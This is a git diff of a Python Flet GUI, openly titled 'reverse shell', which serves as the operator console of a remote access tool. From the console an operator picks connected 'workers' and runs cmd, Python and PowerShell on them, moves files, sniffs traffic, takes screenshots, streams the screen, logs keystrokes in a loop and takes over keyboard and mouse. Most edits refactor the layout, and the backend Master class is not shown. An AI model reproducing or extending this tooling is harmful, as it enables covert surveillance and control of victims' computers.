@@ -20,7 +20,7 @@ class App:
     def __init__(self):
         self.input_required_functions: dict[str,Callable[[],ft.AlertDialog]]= {"cmd" : self.cmd,"python":self.python,"powershell":self.powershell,"receive_file":self.receive_file,"send_file":self.send_file,"sniff_from_worker":self.sniff_from_worker}
         self.page: ft.Page | None = None
-        self.master = Master("10.0.0.11",5555)
+        self.master = Master("10.0.0.9",5555)
         threading.Thread(target = self.master.connect, daemon=True).start()
         self.title = ft.Container(
             content=ft.Text("reverse shell", size=40, italic=True, weight=FontWeight.BOLD),
@@ -41,18 +41,12 @@ class App:
             disabled=True
         )
         self.workers = ft.Dropdown(
+            border=ft.InputBorder.UNDERLINE,
             enable_filter=True,
             editable=True,
-            leading_icon=ft.Icons.SEARCH,
             label="workers",
-            options=list(self.master.clients.keys()),
+            options=[ft.DropdownOption(key = key) for key in self.master.clients.keys()],
             on_change=self.chosen_client
-        )
-        self.connected_worker=ft.DataTable(
-            columns=[
-                ft.DataColumn(ft.Text("choose a worker:", size=30, italic=True, weight=FontWeight.BOLD)),
-                ft.DataColumn(ft.Text())
-            ]
         )
         self.output_box =ft.DataTable(
             vertical_lines=ft.BorderSide(3, ft.Colors.GREY),
@@ -68,7 +62,7 @@ class App:
             ]
 
         )
-        self.exit = False
+        self.listen = True
         self.livestream = ft.Checkbox(label="live stream", on_change=self.live_steam_pressed, disabled=True)
         self.control_keys = ft.Checkbox(label="control the keys of the worker", on_change=self.control_keys_pressed, disabled=True)
         self.control_mouse = ft.Checkbox(label="control the mouse of the worker", on_change=self.control_mouse_of_worker, disabled=True)
@@ -78,6 +72,7 @@ class App:
         threading.Thread(target=self.master.show_stream, daemon=True).start()
         threading.Thread(target=self.master.control_keys,daemon=True).start()
         threading.Thread(target=self.master.control_mouse_on_worker, daemon=True).start()
+
 
 
 
@@ -95,7 +90,8 @@ class App:
 
     def update_clients(self):
         self.workers.options = [ft.DropdownOption(key = key) for key in self.master.clients.keys()]
-        self.page.update(self.workers)
+        if self.page:
+            self.page.update()
 
     def live_stream_stopped(self):
         self.livestream.value = False
@@ -105,8 +101,7 @@ class App:
         self.master.streaming = self.livestream.value
 
     def exit_button_pressed(self,e):
-        self.exit = True
-
+        self.listen = False
     def add_output(self, message:str):
         self.output_box.rows.insert(0,ft.DataRow(
             [ft.DataCell(ft.Text(message,text_align=ft.TextAlign.CENTER))]
@@ -187,6 +182,7 @@ class App:
 
         self.page.close(self.dlg)
 
+
     def choose_command(self,e):
         if self.commands.value is None:
             return
@@ -198,9 +194,10 @@ class App:
             if function == "screen_shot":
                 self.save_file(self.master.run2(function,function.encode()))
             else:
-                while not self.exit:
+                while self.listen:
                     self.add_output(self.master.run2("listen_to_keys", "listen_to_keys".encode()).decode())
-                self.exit = False
+                self.listen = True
+                self.add_output(self.master.run2("stop_listen_to_keys", b"stop_listen_to_keys").decode())
 
     def main(self,page:ft.Page):
         self.page = page
@@ -211,95 +208,44 @@ class App:
         self.page.add(
                 self.title,
                         ft.Row(
-                          [
-                              # ft.Container(
-                              #     content=ft.ListView(controls=[self.connected_worker]),
-                              #     bgcolor=ft.Colors.BLUE_ACCENT,
-                              #     alignment=ft.alignment.top_center,
-                              #     expand=True,
-                              #     margin=10,
-                              #     padding=10,
-                              #     border_radius=10,
-                              # ),
-                              ft.Column(
-                                  spacing=10,
-                                  controls=[
-                                      ft.Container(
-                                          bgcolor=ft.Colors.BLUE_ACCENT,
-                                          margin=10,
-                                          padding=10,
-                                          border_radius=10,
-                                          content=ft.DataTable(
-                                              divider_thickness=0,
-                                              vertical_lines=ft.BorderSide(color=ft.Colors.BLACK, width=1),
-                                              horizontal_lines=ft.BorderSide(color=self.page.bgcolor, width=0),
-                                              columns=[
-                                                   ft.DataColumn(self.workers),
+                        controls=[
+                            ft.Container(
+                                content=ft.DataTable(
+                                    divider_thickness=0,
+                                    vertical_lines=ft.BorderSide(color=ft.Colors.BLACK, width=1),
+                                    horizontal_lines=ft.BorderSide(color=self.page.bgcolor, width=0),
+                                    columns=[ft.DataColumn(self.workers)],
+                                    rows=[
+                                        ft.DataRow([ft.DataCell(self.commands)]),
+                                        ft.DataRow([ft.DataCell(self.livestream)]),
+                                        ft.DataRow([ft.DataCell(self.control_keys)]),
+                                        ft.DataRow([ft.DataCell(self.control_mouse)])
+                                    ]
 
+                                ),
+                                bgcolor = ft.Colors.PURPLE_400,
+                                alignment = ft.alignment.top_center,
+                                width = 400,
+                                margin = 10,
+                                padding = 10,
+                                border_radius = 10,
+                            ),
+                            ft.VerticalDivider(width=6, thickness=3),
+                            ft.Container(
+                                alignment=ft.alignment.top_center,
+                                content=ft.ListView(controls=[self.output_box]),
+                                bgcolor=ft.Colors.BLUE_ACCENT,
+                                expand=True,
+                                margin=10,
+                                padding=10,
+                                border_radius=10,
+                            ),
 
-                                                   ],
-                                              rows=[
-                                                  ft.DataRow([ft.DataCell(self.commands)]),
-                                                  ft.DataRow([ft.DataCell(self.livestream)]),
-                                                  ft.DataRow([ft.DataCell(self.control_keys)]),
-                                                  ft.DataRow([ft.DataCell(self.control_mouse)])
-                                              ]
-
-                                          )
-                                      ),
-                                      ft.Container(
-
-                                          content=self.output_box,
-                                          bgcolor=ft.Colors.BLUE_ACCENT,
-                                          alignment=ft.alignment.center,
-                                          expand=True,
-                                          margin=10,
-                                          padding=10,
-                                          border_radius=10,
-
-                                      ),
-
-                                  ]
-                              ),
-
-                              # ft.Container(
-                              #     bgcolor=ft.Colors.AMBER,
-                              #     margin=10,
-                              #     padding=10,
-                              #     border_radius=10,
-                              #     content=ft.Column(
-                              #         [
-                              #             ft.DataTable(
-                              #               divider_thickness=0,
-                              #               vertical_lines = ft.BorderSide(color=ft.Colors.BLACK,width=1),
-                              #               horizontal_lines = ft.BorderSide(color=self.page.bgcolor,width=0),
-                              #               columns= [ft.DataColumn(self.commands),
-                              #                         ft.DataColumn(ft.IconButton(ft.Icons.ADD_ROUNDED, on_click=self.choose_command,icon_color=ft.Colors.BLACK,tooltip="start your function")),
-                              #                         ft.DataColumn(ft.IconButton(ft.Icons.QUESTION_MARK_ROUNDED,
-                              #                                                     on_click=lambda e: page.open(
-                              #                                                         self.input_help_dlg),
-                              #                                                     icon_color=ft.Colors.BLACK,
-                              #                                                     tooltip="how to add")),
-                              #
-                              #                         ],
-                              #                 rows=[
-                              #                     ft.DataRow([ft.DataCell(self.input_for_commends),ft.DataCell(ft.IconButton(ft.Icons.ADD_ROUNDED, on_click=self.send_button_pressed,icon_color=ft.Colors.BLACK,tooltip="send input")),ft.DataCell(ft.Text())]),
-                              #                 ]
-                              #
-                              #             ),
-                              #
-                              #         ]
-                              #     )
-                              # )
-                          ]
+                        ],
+                        spacing = 0,
+                        expand = True,
                         )
-                      )
+        )
 
-
-
-        # self.page.add(ft.Container(content=self.commands,bgcolor=ft.Colors.BLACK))
-        # self.page.add(ft.IconButton(ft.Icons.ADD_ROUNDED, on_click=self.add_button_clicked,icon_color=ft.Colors.BLACK,tooltip="add your inserted ip's"))
-        #.page.add(self.input_for_commends)
-        # self.page.add(self.output_box)
 
 ft.app(App().main)
